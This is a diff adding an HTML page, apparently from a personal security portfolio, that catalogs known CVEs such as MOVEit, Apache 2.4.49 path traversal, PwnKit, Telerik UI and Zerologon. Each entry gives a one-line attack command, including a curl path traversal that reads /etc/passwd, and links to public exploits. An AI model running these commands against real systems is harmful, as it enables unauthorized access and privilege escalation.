@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>r4venn | CVEs</title>
+  <link rel="stylesheet" href="/css/styles.css"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/monokai-sublime.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet"/>
+</head>
+<body>
+
+  <div id="particles-js"></div>
+
+  <div class="terminal">
+    <h1 class="glitch-pages" data-text=">_r4ven">> CVE Database<span class="cursor">_</span></h1>
+
+    <div class="nav-buttons">
+      <a class="btn" href="#web">Web</a>
+      <a class="btn" href="#privesc">Privesc</a>
+      <a class="btn" href="#deserialization">Deserialization</a>
+      <a class="btn" href="#auth">Auth Bypass</a>
+      <a class="btn" href="/">/Return to Base</a>
+    </div>
+  </div>
+
+  <!-- Web -->
+  <section id="web">
+    <h2>// Web Vulns</h2>
+
+    <div class="card">
+      <h3>CVE-2023-34362 – MOVEit Transfer RCE</h3>
+      <p><strong>Afecta:</strong> Progress MOVEit Transfer</p>
+      <p>Exploit de SQL Injection + RCE no autenticado utilizado en ataques masivos por ransomware groups.</p>
+      <pre><code class="language-bash">curl -X POST https://target.com/moveitapi -d 'exploit_payload_here'</code></pre>
+      <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34362" target="_blank">Ver en NVD →</a>
+    </div>
+
+    <div class="card">
+      <h3>CVE-2021-41773 – Apache Path Traversal</h3>
+      <p><strong>Afecta:</strong> Apache HTTP Server 2.4.49</p>
+      <p>Permite leer archivos arbitrarios mediante URL encoding, incluso ejecutar código si tiene permisos de ejecución.</p>
+      <pre><code class="language-bash">curl http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd</code></pre>
+      <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41773" target="_blank">Ver en NVD →</a>
+    </div>
+  </section>
+
+  <!-- Privesc -->
+  <section id="privesc">
+    <h2>// Privilege Escalation</h2>
+
+    <div class="card">
+      <h3>CVE-2021-4034 – Polkit (PwnKit)</h3>
+      <p><strong>Afecta:</strong> sistemas Linux con `pkexec`</p>
+      <p>Permite escalada de privilegios a root mediante manipulación de variables de entorno.</p>
+      <pre><code class="language-bash">gcc pwnkit.c -o pwnkit && ./pwnkit</code></pre>
+      <a href="https://www.exploit-db.com/exploits/50878" target="_blank">Exploit en EDB →</a>
+    </div>
+  </section>
+
+  <!-- Deserialization -->
+  <section id="deserialization">
+    <h2>// Deserialization</h2>
+
+    <div class="card">
+      <h3>CVE-2019-18935 – Telerik UI RCE</h3>
+      <p><strong>Afecta:</strong> Telerik UI para ASP.NET AJAX</p>
+      <p>Permite ejecutar comandos en el servidor explotando una falla en el sistema de serialización.</p>
+      <pre><code class="language-bash">python3 telerik_exploit.py -u http://target</code></pre>
+      <a href="https://github.com/bao7uo/dp_crypto" target="_blank">Script PoC →</a>
+    </div>
+  </section>
+
+  <!-- Auth Bypass -->
+  <section id="auth">
+    <h2>// Auth Bypass</h2>
+
+    <div class="card">
+      <h3>CVE-2020-1472 – Zerologon</h3>
+      <p><strong>Afecta:</strong> Domain Controllers Windows Server</p>
+      <p>Permite autenticación sin contraseña explotando Netlogon con vectores nulos.</p>
+      <pre><code class="language-bash">python3 zerologon_tester.py 10.10.10.1</code></pre>
+      <a href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank">Exploit →</a>
+    </div>
+  </section>
+
+  <!-- Sidebar -->
+  <div class="social-sidebar">
+    <a href="https://app.hackthebox.com/profile/802825" target="_blank" title="Hack The Box">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" width="24" height="24" stroke-width="2">
+        <path d="M12 3l8 4.5v9l-8 4.5-8-4.5v-9l8-4.5"></path>
+        <path d="M12 12l8-4.5M12 12v9M12 12L4 7.5"></path>
+      </svg>
+    </a>
+  
+    <a href="https://github.com/venomcrane" target="_blank" title="GitHub">
+      <i class="fab fa-github"></i>
+    </a>
+  
+    <a href="https://www.linkedin.com/in/brandon-gachuz-6344b82b7/" target="_blank" title="LinkedIn">
+      <i class="fab fa-linkedin"></i>
+    </a>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
+  <script src="/js/main.js"></script>
+</body>
+</html>
